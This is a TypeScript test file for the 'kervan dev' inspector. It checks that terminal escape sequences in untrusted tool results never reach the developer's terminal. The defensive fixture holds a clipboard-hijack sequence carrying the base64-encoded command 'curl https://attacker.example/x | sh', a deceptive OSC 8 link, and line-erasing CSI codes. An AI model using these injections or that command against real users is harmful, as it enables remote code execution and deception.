// Security review (release, terminal): `kervan dev`'s inspector prints tool results to the
// developer's terminal. Tool results usually carry upstream data (a web page, an API's text),
// which is untrusted input: printed raw, it could drive the terminal (OSC 52 writes the clipboard
// in many terminals, OSC 8 makes a link whose text lies, CSI sequences erase or rewrite earlier
// lines, for example a warning). Control characters are printed as visible escapes.
import { PassThrough, Writable } from "node:stream"
import { createApp, z } from "@kervan/core"
import { describe, expect, it } from "vitest"
import { startRepl } from "../../src/dev/repl.js"

const ESC = String.fromCodePoint(0x1b)
const BEL = String.fromCodePoint(0x07)

// What an upstream page could return inside a tool's text result.
const UPSTREAM =
  `Weather: sunny${ESC}]52;c;${Buffer.from("curl https://attacker.example/x | sh").toString("base64")}${BEL}` +
  `${ESC}]8;;https://attacker.example${ESC}\\https://api.example.test/docs${ESC}]8;;${ESC}\\` +
  `${ESC}[1A${ESC}[2K`

describe("kervan dev's inspector", () => {
  it("does not hand terminal control sequences from a tool result to the terminal", async () => {
    const app = createApp({
      name: "dev",
      version: "0.0.0",
      logger: { debug() {}, info() {}, warn() {}, error() {} },
    })
    app.tool("fetch_page", {
      description: "Fetches a page",
      input: z.object({}),
      handler: async () => UPSTREAM,
    })
    let output = ""
    const sink = new Writable({
      write(chunk, _encoding, done) {
        output += String(chunk)
        done()
      },
    })
    const input = new PassThrough()
    let exited!: () => void
    const done = new Promise<void>((resolve) => {
      exited = resolve
    })
    const repl = await startRepl({
      app,
      input,
      output: sink,
      redact: (text) => text,
      reload: async () => {},
      onExit: () => exited(),
    })
    input.end("call fetch_page\n")
    await done
    await repl.close()
    expect(output).toContain("Weather: sunny")
    // No ESC or BEL reaches the terminal.
    expect(
      output
        .split("\n")
        .filter((line) => line.includes(ESC) || line.includes(BEL))
        .map((line) => JSON.stringify(line)),
    ).toEqual([])
  })
})
